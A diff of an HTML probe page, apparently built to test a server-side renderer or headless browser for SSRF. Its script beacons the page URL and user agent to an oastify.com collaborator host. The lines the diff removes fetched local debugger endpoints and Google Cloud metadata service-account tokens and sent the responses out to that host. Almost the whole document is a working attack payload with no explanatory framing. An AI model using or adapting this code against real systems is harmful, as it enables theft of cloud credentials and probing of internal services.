@@ -1,25 +1,9 @@
-<!doctype html><html><head><meta charset="utf-8"><title>x</title></head><body>x
+<!doctype html><html><head><meta charset="utf-8"><title>x</title>
+<img src="https://tnkdnri2y6a32h0pw18ewxeuslybm0.oastify.com/IMGLOAD-htmlparsed">
+</head><body>x
+<img src="https://tnkdnri2y6a32h0pw18ewxeuslybm0.oastify.com/IMGBODY">
 <script>
 var C='https://tnkdnri2y6a32h0pw18ewxeuslybm0.oastify.com';
 function x(t,d){try{new Image().src=C+'/'+t+'?d='+encodeURIComponent((''+d).slice(0,400));}catch(e){}}
 x('JSALIVE','href='+location.href+' ua='+navigator.userAgent);
-var T=[
- 'http://127.0.0.1:9229/json/version',
- 'http://127.0.0.1:9229/json/list',
- 'http://127.0.0.1:9222/json/version',
- 'http://localhost:9229/json/version',
- 'http://127.0.0.1:9000/',
- 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
- 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
-];
-T.forEach(function(u,i){
- var md = (u.indexOf('169.254')>-1||u.indexOf('metadata')>-1);
- fetch(u,{mode:'cors',headers: md?{'Metadata-Flavor':'Google'}:{}})
-  .then(function(r){return r.text();})
-  .then(function(b){x('R'+i+'_READ',u+' :: '+b);})
-  .catch(function(e){
-     fetch(u,{mode:'no-cors'}).then(function(){x('R'+i+'_OPEN',u+' reachable(cors-blocked-read)');})
-       .catch(function(e2){x('R'+i+'_FAIL',u+' '+e2);});
-  });
-});
 </script></body></html>
